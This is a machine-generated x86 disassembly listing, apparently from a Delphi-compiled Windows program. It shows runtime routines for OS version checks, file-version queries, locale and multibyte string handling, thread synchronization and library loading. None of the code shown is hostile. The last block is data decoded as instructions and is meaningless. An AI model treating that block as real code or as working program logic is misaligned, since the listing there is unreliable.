cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_403368
xor eax eax
mov [ rw-data ] eax
sub_40c2fc
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_4043d4
sub_40c38c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40c462
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4041fc
lea eax [ ebp - 0x8 ]
call j_sub_404630
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404624
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c469
lea eax [ ebp - 0x8 ]
call sub_404164
retn
mov eax ebx
call sub_4026ec
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40c445
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404624
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_40270c
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40c478
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40c4f0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_404624
mov edx esi
dec edx
call sub_40c478
sub_40c52c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404424
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40c554
pop esi
pop ebx
retn
mov eax ebx
call sub_404424
mov esi eax
sub_40c554
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_404424
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c764
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c5ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_404424
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c764
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c764
dec eax
mov ebx eax
sub_40c63c
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404424
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c5ac
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_404424
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c6a0
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404424
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_404424
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c5ac
mov eax esi
call sub_404424
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_404424
mov [ esp ] eax
jmp r-xdata
sub_40c728
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_404624
add eax esi
dec eax
call sub_40c700
sub_40c764
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_404624
add eax ebx
dec eax
call sub_40c700
add eax ebx
sub_40c7a0
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_404424
cmp ebx eax
jg r-xdata
cmp [ esi + ebx - 0x1 ] 0x5c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c4f0
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40c7d4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_4041b8
mov eax [ ebx ]
call sub_404424
mov edx eax
mov eax [ ebx ]
call sub_40c7a0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_40442c
sub_40c814
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_404624
push eax
mov eax esi
call sub_404624
mov ebp eax
mov eax ebp
pop edx
call sub_40c84c
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c84c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_4089d0
mov [ esp ] eax
mov eax ebp
call sub_4089d0
mov edi eax
mov edx ebp
mov eax esi
call sub_408b68
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40c514
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_408b68
mov ebx eax
inc ebx
sub_40c8ec
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c914
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c914
test eax eax
jne r-xdata
sub_40c914
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_408b54
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40c514
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_408b54
mov edi eax
test edi edi
jne r-xdata
sub_40c954
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c9b8
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_4043d4
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_4084c8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c9bf
lea eax [ ebp - 0xc ]
call sub_404164
retn
sub_40c9c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c954
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40ca40
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40ca28
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c9c8
pop ecx
push ebp
call sub_40c9c8
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402ea0
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40cbb4
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40ce7f
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40ca40
call sub_40b430
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40b380
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_4041b8
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40b380
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_4084c8
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40b380
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_4084c8
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40b3cc
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40b3cc
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40b380
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_4084c8
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40b3cc
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40b380
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b6b8
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_4041b8
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40b380
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b6b8
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_4041b8
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40b3cc
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40b380
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_4041b8
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40b380
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_4041b8
lea eax [ ebp - 0x8 ]
call sub_404164
lea eax [ ebp - 0xc ]
call sub_404164
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40b380
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_4084c8
test eax eax
jne r-xdata
call sub_40b608
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041fc
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041fc
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4044e4
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4044e4
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40b3cc
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ce86
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_404188
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40b380
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_4084c8
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40b380
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_4084c8
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4041fc
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4041fc
jmp r-xdata
sub_40cf34
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40cfc4
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40b334
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc34
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_403b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cfcb
lea eax [ ebp - 0x14 ]
call sub_404164
retn
sub_40d01c
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_40895c
mov [ rw-data ] eax
sub_40d0a0
push ebx
push esi
push edi
push ebp
call sub_40371c
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_40270c
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403358
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403704
sub_40d108
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40d0f0
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d190
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407fe4
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40d090
mov [ ebp ] eax
sub_40d190
push ebx
mov ebx eax
mov eax ebx
call sub_40d0f0
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40d090
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40d1d0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403338
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_40d244
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax esi
call sub_40d2d0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_403368
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_40d2d0
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d28c
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40d108
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40d098
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40d078
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40d098
test eax eax
je r-xdata
mov eax edi
call sub_40d28c
test bl bl
je r-xdata
mov eax edi
call sub_40d2c0
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40d078
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40d084
sub_40d36c
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d108
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40d098
mov eax ebx
call sub_40d2a4
mov eax ebx
call sub_40d298
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d180
sub_40d3bc
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40d108
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40d2b0
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40d084
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40d078
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40d2b0
mov eax esi
call sub_40d2a4
sub_40d428
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d108
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d180
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40d078
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40d2a4
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40d2a4
sub_40d4a0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40d4c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d53b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_405b04
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_40341c
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d542
lea eax [ ebp - 0x4 ]
call sub_405b04
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_40341c
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40d4a0
test al al
jne r-xdata
mov al 0x1
sub_40d55c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d5ce
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d5b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404624
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d5b7
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d5e0
sbb eax 0x4000000
and ecx [ eax ]
cmp [ fs : eax ] ecx
cld
and cl [ eax ]
or al 0x38
dec eax
add ah dh
and cl [ eax ]
shl [ 0x22ec0048 ] 0x1
dec eax
add ah cl
cmp [ eax ] ecx
in al 0x22
dec eax
add [ edx + edi ] cl
dec eax
add ah bl
and cl [ eax ]
fdiv [ esi ]
dec eax
add ah dl
and cl [ eax ]
in al dx
aaa
dec eax
add ah cl
and cl [ eax ]
js r-xdata
add [ eax + 0x3b ] bl
dec eax
add [ edx + 0x39240048 ] cl
dec eax
add [ edx + 0x38f80048 ] al
dec eax
add [ edx + 0x48 ] bh
add [ ebx + edi + 0x48 ] ch
add [ edx + 0x48 ] dh
add [ eax ] al
cmp ecx [ eax ]
insb
and cl [ eax ]
enter 0x4837 0x0
and cl [ fs : eax ]
lodsb [ esi ]
cmp cl [ eax ]
pop esp
and cl [ eax ]
enter 0x483a 0x0
push esp
and cl [ eax ]
mov esp 0x4c004836
and cl [ eax ]
push eax
dec eax
add [ edx + 0x48 ] al
add ah ch
cmp [ eax ] cl
cmp al 0x22
dec eax
add al al
cmp [ eax ] ecx
xor al 0x22
dec eax
add [ ebp + esi + 0x222c0048 ] al
dec eax
add [ eax + 0x2400483a ] ah
and cl [ eax ]
les esi [ edi ]
dec eax
add [ eax ] ch
add [ eax ] al
add [ edx ] bl
dec eax
add [ eax + 0x483a ] al
add [ eax ] al
add [ eax ] bl
and cl [ eax ]
fdiv [ 0x48 ]
add [ eax ] al
adc al 0x22
dec eax
add [ ecx + edi + 0x48 ] ch
add [ eax ] al
adc [ edx ] ah
dec eax
add [ eax + 0x4835 ] dl
add [ eax ] al
add [ edx ] cl
dec eax
add [ eax + 0x4836 ] cl
add [ eax ] al
add [ eax ] cl
and cl [ eax ]
js r-xdata
dec eax
add ah al
and cl [ eax ]
pop esp
cmp [ eax ] cl
mov esp 0xcc004822
cmp [ eax ] cl
mov ah 0x22
dec eax
add [ edi + esi + 0x22ac0048 ] ch
dec eax
add [ eax - 0x5bffb7c9 ] bh
and cl [ eax ]
movsb [ edi ] [ esi ]
cmp cl [ eax ]
pushfd
and cl [ eax ]
mov ah 0x37
dec eax
add [ edx + 0x3b580048 ] dl
hlt
dec eax
add [ eax ] al
add [ eax ] al
add [ edx ] al
dec eax
add [ esi + esi ] al
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
and cl [ eax ]
shl [ edi ] 0x48
add [ eax ] al
add [ eax ] al
add ah bh
and [ eax ] ecx
and [ ecx ] bh
dec eax
add [ eax ] al
add [ eax ] al
add al bh
and [ eax ] ecx
jl r-xdata
in al 0x21
dec eax
add [ eax + 0x4837 ] ch
add [ eax ] al
add al ah
and [ eax ] ecx
and al 0x37
dec eax
add [ eax ] al
add [ eax ] al
add ah dh
and [ eax ] ecx
loopne r-xdata
dec eax
add [ eax ] al
